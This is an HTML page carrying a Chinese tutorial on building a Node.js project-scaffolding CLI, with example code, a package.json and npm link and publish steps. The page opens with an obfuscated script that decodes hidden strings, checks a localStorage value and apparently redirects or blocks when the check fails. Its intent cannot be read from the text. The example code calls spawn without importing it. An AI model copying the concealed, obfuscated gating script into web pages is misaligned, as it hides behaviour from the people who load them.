<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x554c(p,s){var l=_0x1ba9();return(_0x554c=function(s,n){var a=l[s-=149];void 0===_0x554c.IpTCVb&&(_0x554c.OMLVzs=function(s,n){var a,t=[],p=0,l="";for(s=(s=>{for(var n,a,t="",p="",l=0,c=0;a=s.charAt(c++);~a&&(n=l%4?64*n+a:a,l++%4)&&(t+=String.fromCharCode(255&n>>(-2*l&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var o=0,e=t.length;o<e;o++)p+="%"+("00"+t.charCodeAt(o).toString(16)).slice(-2);return decodeURIComponent(p)})(s),c=0;c<256;c++)t[c]=c;for(c=0;c<256;c++)p=(p+t[c]+n.charCodeAt(c%n.length))%256,a=t[c],t[c]=t[p],t[p]=a;for(var c=0,p=0,o=0;o<s.length;o++)a=t[c=(c+1)%256],t[c]=t[p=(p+t[c])%256],t[p]=a,l+=String.fromCharCode(s.charCodeAt(o)^t[(t[c]+t[p])%256]);return l},p=arguments,_0x554c.IpTCVb=!0);var s=s+l[0],t=p[s];return t?a=t:(void 0===_0x554c.VbYwjz&&(_0x554c.VbYwjz=!0),a=_0x554c.OMLVzs(a,n),p[s]=a),a})(p,s)}var _0x52e14f=_0x554c;if((()=>{for(var s=_0x554c,n=_0x1ba9();;)try{if(782123==+parseInt(s(160,"QqRB"))+-parseInt(s(172,"9t#L"))/2*(parseInt(s(159,"0zO("))/3)+parseInt(s(162,"%hs^"))/4*(parseInt(s(157,"QqRB"))/5)+parseInt(s(168,"oK@3"))/6*(-parseInt(s(158,"fXS9"))/7)+parseInt(s(153,"q*S9"))/8+parseInt(s(169,"244a"))/9*(parseInt(s(175,"9#Yz"))/10)+parseInt(s(164,"vERy"))/11)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x52e14f(163,"Y0j[")](_0x52e14f(156,"fXS9"))!=_0x52e14f(165,"%hs^"))throw window[_0x52e14f(161,"^@MJ")][_0x52e14f(166,"s6U)")](_0x52e14f(154,"Hh8Z")),Error();function _0x1ba9(){var s=["f0VcMYxdPSoBBG","WO3dR8kOE8oTAxyAxKxdNCkkFW","zCkYfCoBqq","WO5vW6TWewfW","W57dLSo4nCkRqCkXWRa","D3fGrSoet3ldHSosWOFcG8oD","vSo0W6hdL3ddTSoWW45vW6jrub7cOa","d0FdPI0QWRdcOW","WParleKBdSol","W5dcTCkaW5HShMK","W4dcVfBcO8oYWOpcUbddPvb8ct0","W6BcJCo9WPddHmktW68pW4TPga","WPenaCo1cSoNkCkl","tCokmI3cPH3cQ8oLemo6W5LiBG","W57dNSkZemkzwSkUWRGX","WQNdMCkrWRFcJ8o5WR0TW7BcSKiJWPS","zCk6nSk0E0bwkfuMf8o0bCkw","vGNcP8oOW71udwykBmoCaIa","ECkCWQRdKgFcPSkTW4NdRtJcGmohW7pdPHK9jwaUWRm9W6ithSk5W54","WPmnsSkLyCkCE8kdW54rrdpcGW","WO/cUmkHWRCDyvqQwq","W6xdJsZdLMZcTSo0","W7/dO8oWWPefqgS/Ca","ymk7yCkLWRvGW4fKWP7cHmoAemox","W6BcVvhcJdxcLCoelCkCW7BcPq","W7KeWR7cMYVdGvCW","jmo1xSkrc8kjWRldLdxdOSklk8kf"];return(_0x1ba9=function(){return s})()}document.title="node 自定义脚手架",document.getElementById("article").innerHTML='<div><p>自定义一个 Node.js 脚手架工具可以帮助你快速生成项目模板、初始化项目结构、安装依赖等。下面是一个简单的指南，教你如何创建自己的脚手架工具。</p>\n<hr>\n<h3>一、项目结构</h3>\n<p>首先，创建一个新的 Node.js 项目来开发你的脚手架工具。</p>\n<pre><code class="language-sh"><span class="hljs-built_in">mkdir</span> my-scaffold\n<span class="hljs-built_in">cd</span> my-scaffold\nnpm init -y\n</code></pre>\n<hr>\n<h3>二、安装必要的依赖</h3>\n<p>为了实现脚手架的功能，你需要安装一些常用的 npm 包，例如 <code>commander</code> 用于处理命令行参数，<code>inquirer</code> 用于用户交互，<code>ejs</code> 用于模板渲染，<code>fs-extra</code> 用于文件操作，<code>ora</code> 用于显示加载动画，<code>chalk</code> 用于终端输出颜色，<code>download-git-repo</code> 用于下载 Git 仓库等。</p>\n<pre><code class="language-sh">npm install commander inquirer ejs fs-extra ora chalk download-git-repo\n</code></pre>\n<hr>\n<h3>三、编写脚手架代码</h3>\n<p>创建一个 <code>index.js</code> 文件，并编写脚手架的核心逻辑。</p>\n<pre><code class="language-javascript"><span class="hljs-meta">#!/usr/bin/env node</span>\n\n<span class="hljs-keyword">const</span> { <span class="hljs-title class_">Command</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;commander&#x27;</span>);\n<span class="hljs-keyword">const</span> inquirer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;inquirer&#x27;</span>);\n<span class="hljs-keyword">const</span> ejs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>);\n<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs-extra&#x27;</span>);\n<span class="hljs-keyword">const</span> ora = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ora&#x27;</span>);\n<span class="hljs-keyword">const</span> chalk = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;chalk&#x27;</span>);\n<span class="hljs-keyword">const</span> download = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;download-git-repo&#x27;</span>);\n<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);\n\n<span class="hljs-keyword">const</span> program = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>();\n\nprogram\n  .<span class="hljs-title function_">name</span>(<span class="hljs-string">&#x27;my-scaffold&#x27;</span>)\n  .<span class="hljs-title function_">description</span>(<span class="hljs-string">&#x27;A custom Node.js scaffold tool&#x27;</span>)\n  .<span class="hljs-title function_">version</span>(<span class="hljs-string">&#x27;1.0.0&#x27;</span>);\n\nprogram\n  .<span class="hljs-title function_">command</span>(<span class="hljs-string">&#x27;create &lt;project-name&gt;&#x27;</span>)\n  .<span class="hljs-title function_">description</span>(<span class="hljs-string">&#x27;Create a new project&#x27;</span>)\n  .<span class="hljs-title function_">action</span>(<span class="hljs-title function_">async</span> (projectName) =&gt; {\n    <span class="hljs-keyword">try</span> {\n      <span class="hljs-comment">// 1. 询问用户输入</span>\n      <span class="hljs-keyword">const</span> answers = <span class="hljs-keyword">await</span> inquirer.<span class="hljs-title function_">prompt</span>([\n        {\n          <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;input&#x27;</span>,\n          <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;description&#x27;</span>,\n          <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Please enter project description:&#x27;</span>,\n        },\n      ]);\n\n      <span class="hljs-comment">// 2. 显示加载动画</span>\n      <span class="hljs-keyword">const</span> spinner = <span class="hljs-title function_">ora</span>(<span class="hljs-string">&#x27;Creating project...&#x27;</span>).<span class="hljs-title function_">start</span>();\n\n      <span class="hljs-comment">// 3. 创建项目目录</span>\n      <span class="hljs-keyword">const</span> projectPath = path.<span class="hljs-title function_">resolve</span>(projectName);\n      fs.<span class="hljs-title function_">mkdirpSync</span>(projectPath);\n\n      <span class="hljs-comment">// 4. 渲染模板文件（假设有一个简单的模板文件）</span>\n      <span class="hljs-keyword">const</span> template = <span class="hljs-string">`\n      {\n        &quot;name&quot;: &quot;&lt;%= name %&gt;&quot;,\n        &quot;version&quot;: &quot;1.0.0&quot;,\n        &quot;description&quot;: &quot;&lt;%= description %&gt;&quot;,\n        &quot;main&quot;: &quot;index.js&quot;,\n        &quot;scripts&quot;: {\n          &quot;start&quot;: &quot;node index.js&quot;\n        },\n        &quot;dependencies&quot;: {}\n      }\n      `</span>;\n\n      <span class="hljs-keyword">const</span> renderedContent = ejs.<span class="hljs-title function_">render</span>(template, { <span class="hljs-attr">name</span>: projectName, <span class="hljs-attr">description</span>: answers.<span class="hljs-property">description</span> });\n      fs.<span class="hljs-title function_">writeFileSync</span>(path.<span class="hljs-title function_">join</span>(projectPath, <span class="hljs-string">&#x27;package.json&#x27;</span>), renderedContent);\n\n      <span class="hljs-comment">// 5. 下载模板（可选，从 Git 仓库下载）</span>\n      <span class="hljs-comment">// await download(&#x27;github:user/repo#branch&#x27;, projectPath, { clone: true });</span>\n\n      <span class="hljs-comment">// 6. 完成</span>\n      spinner.<span class="hljs-title function_">succeed</span>(<span class="hljs-string">&#x27;Project created successfully!&#x27;</span>);\n      <span class="hljs-keyword">const</span> child = <span class="hljs-title function_">spawn</span>(<span class="hljs-string">&quot;yarn&quot;</span>, [<span class="hljs-string">&quot;install&quot;</span>], {\n            <span class="hljs-attr">cwd</span>: projectName,\n            <span class="hljs-attr">stdio</span>: <span class="hljs-string">&quot;inherit&quot;</span>,\n          });\n      child.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;close&#x27;</span>,<span class="hljs-function">()=&gt;</span>{\n            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(chalk.<span class="hljs-title function_">green</span>(<span class="hljs-string">&#x27;Succeed.&#x27;</span>))\n          })\n      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(chalk.<span class="hljs-title function_">green</span>(<span class="hljs-string">`Project <span class="hljs-subst">${projectName}</span> created at <span class="hljs-subst">${projectPath}</span>`</span>));\n    } <span class="hljs-keyword">catch</span> (error) {\n      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(chalk.<span class="hljs-title function_">red</span>(<span class="hljs-string">&#x27;Failed to create project:&#x27;</span>), error);\n    }\n  });\n\nprogram.<span class="hljs-title function_">parse</span>(process.<span class="hljs-property">argv</span>);\n</code></pre>\n<hr>\n<h3>四、代码说明</h3>\n<ol>\n<li><strong>命令行参数解析</strong>  ：使用 <code>commander</code> 解析命令行参数，定义 <code>create &lt;project-name&gt;</code> 命令。</li>\n<li><strong>用户交互</strong>  ：使用 <code>inquirer</code> 询问用户输入项目描述。</li>\n<li><strong>加载动画</strong>  ：使用 <code>ora</code> 显示加载动画，提高用户体验。</li>\n<li><strong>文件操作</strong>  ：使用 <code>fs-extra</code> 创建项目目录，并写入渲染后的 <code>package.json</code> 文件。</li>\n<li><strong>模板渲染</strong>  ：使用 <code>ejs</code> 渲染模板文件，将用户输入插入到模板中。</li>\n<li><strong>下载模板（可选）</strong>  ：使用 <code>download-git-repo</code> 从 Git 仓库下载项目模板（如果需要）。</li>\n</ol>\n<hr>\n<h3>五、全局安装和测试</h3>\n<ol>\n<li>\n<p><strong>在 <code>package.json</code> 中添加 <code>bin</code> 字段</strong>  ：</p>\n<pre><code class="language-json"><span class="hljs-punctuation">{</span>\n  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-scaffold&quot;</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1.0.0&quot;</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;A custom Node.js scaffold tool&quot;</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;main&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;index.js&quot;</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;bin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>\n    <span class="hljs-attr">&quot;my-scaffold&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./index.js&quot;</span>\n  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;dependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>\n    <span class="hljs-attr">&quot;commander&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^9.0.0&quot;</span><span class="hljs-punctuation">,</span>\n    <span class="hljs-attr">&quot;inquirer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^8.0.0&quot;</span><span class="hljs-punctuation">,</span>\n    <span class="hljs-attr">&quot;ejs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^3.0.0&quot;</span><span class="hljs-punctuation">,</span>\n    <span class="hljs-attr">&quot;fs-extra&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^10.0.0&quot;</span><span class="hljs-punctuation">,</span>\n    <span class="hljs-attr">&quot;ora&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^5.0.0&quot;</span><span class="hljs-punctuation">,</span>\n    <span class="hljs-attr">&quot;chalk&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^4.0.0&quot;</span><span class="hljs-punctuation">,</span>\n    <span class="hljs-attr">&quot;download-git-repo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^3.0.0&quot;</span>\n  <span class="hljs-punctuation">}</span>\n<span class="hljs-punctuation">}</span>\n</code></pre>\n</li>\n<li>\n<p><strong>本地链接</strong>  ：</p>\n<p>在脚手架工具项目目录下运行以下命令，将工具链接到全局 npm 包目录：</p>\n<pre><code class="language-sh">npm <span class="hljs-built_in">link</span>\n</code></pre>\n</li>\n<li>\n<p><strong>测试脚手架工具</strong>  ：</p>\n<p>现在，你可以在命令行中使用 <code>my-scaffold</code> 命令：</p>\n<pre><code class="language-sh">my-scaffold create my-new-project\n</code></pre>\n</li>\n</ol>\n<hr>\n<h3>六、发布到 npm（可选）</h3>\n<p>如果你希望其他人也能使用你的脚手架工具，可以将其发布到 npm 仓库。</p>\n<ol>\n<li><strong>注册 npm 账号</strong>  （如果还没有账号）。</li>\n<li><strong>登录 npm</strong>  ：<pre><code class="language-sh">npm login\n</code></pre>\n</li>\n<li><strong>发布包</strong>  ：<pre><code class="language-sh">npm publish\n</code></pre>\n</li>\n</ol>\n<p>发布成功后，其他人就可以通过 <code>npm install -g my-scaffold</code> 安装你的脚手架工具。</p>\n<hr>\n<h3>七、总结</h3>\n<p>通过以上步骤，你可以创建一个简单的 Node.js 脚手架工具，实现项目模板生成、初始化项目结构等功能。根据需求，你可以进一步扩展工具的功能，例如添加更多的用户交互选项、支持更多的模板类型、集成自动化测试等。希望这个指南能帮助你创建自己的脚手架工具！</p>\n</div>'</script></body></html>